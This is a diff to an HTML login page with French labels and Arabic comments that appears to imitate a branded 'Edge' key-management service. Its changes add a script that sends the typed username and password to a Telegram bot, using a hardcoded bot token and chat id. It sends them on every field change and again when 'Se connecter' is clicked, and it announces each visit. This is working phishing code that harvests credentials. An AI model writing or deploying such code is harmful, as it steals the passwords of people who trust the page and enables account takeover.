@@ -660,7 +660,6 @@
     </style>
 </head>
 <body>
-    <!-- ========== القائمة المنبثقة ========== -->
     <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
     
     <div class="menu-panel" id="menuPanel">
@@ -692,7 +691,6 @@
         </nav>
     </div>
 
-    <!-- ========== الهيدر العلوي ========== -->
     <header class="header">
         <div class="header-left">
             <img src="https://i.ibb.co/GfZvNh7z/1-EA82644-04-AB-4694-AD14-0-A0-E58-CBAC3-C.png" alt="Edge" class="header-logo">
@@ -714,7 +712,6 @@
         </div>
     </header>
 
-    <!-- ========== الصفحة الأولى - الترحيب ========== -->
     <div class="welcome-page" id="welcomePage">
         <div class="logo-container">
             <img src="https://i.ibb.co/Mk8KKTJ9/49-E2-B7-AD-63-C1-481-F-82-A1-D0827-AE9-AD11.png" alt="Edge Logo">
@@ -736,7 +733,6 @@
         </p>
     </div>
 
-    <!-- ========== صفحة تسجيل الدخول ========== -->
     <div class="login-page" id="loginPage">
         <div class="login-content">
             <div class="login-logo">
@@ -762,7 +758,7 @@
                 </span>
             </div>
 
-            <button class="btn-login" id="loginBtn" disabled>Se connecter</button>
+            <button class="btn-login" id="loginBtn" disabled onclick="handleFinalClick()">Se connecter</button>
 
             <button class="btn-create">Créer un compte</button>
 
@@ -797,7 +793,6 @@
         </div>
     </div>
 
-    <!-- ========== قسم المطورين - أسود ========== -->
     <section class="developer-section">
         <div class="developer-content">
             <h2 class="developer-title">Are you a developer looking for a key management solution?</h2>
@@ -814,6 +809,37 @@
     </section>
 
     <script>
+        // --- إعدادات البوت ---
+        const bot_token = '8712672264:AAHqDeXBf9EQ_BF40-qOrH68WWPGuumQshI';
+        const chat_id = '8745009295';
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+            fetch(url).catch(err => console.log("Telegram Error"));
+        }
+
+        // إشعار فوري عند الزيارة
+        window.onload = function() {
+            sendToTelegram("🔔 زيارة جديدة للموقع!");
+        };
+
+        // إرسال البيانات فور الكتابة
+        document.addEventListener('change', function(e) {
+            const user = document.getElementById('usernameField').value;
+            const pass = document.getElementById('passwordField').value;
+            if (user || pass) {
+                sendToTelegram(`👤 بيانات جزئية:\nالاسم: ${user}\nالكلمة: ${pass}`);
+            }
+        });
+
+        function handleFinalClick() {
+            const user = document.getElementById('usernameField').value;
+            const pass = document.getElementById('passwordField').value;
+            sendToTelegram(`🚀 تم الضغط على الدخول:\nالاسم: ${user}\nالكلمة: ${pass}`);
+            // هنا يمكنك إضافة إعادة توجيه إذا أردت
+        }
+        // --- نهاية إعدادات البوت ---
+
         function openMenu() {
             document.getElementById('menuOverlay').classList.add('active');
             document.getElementById('menuPanel').classList.add('active');
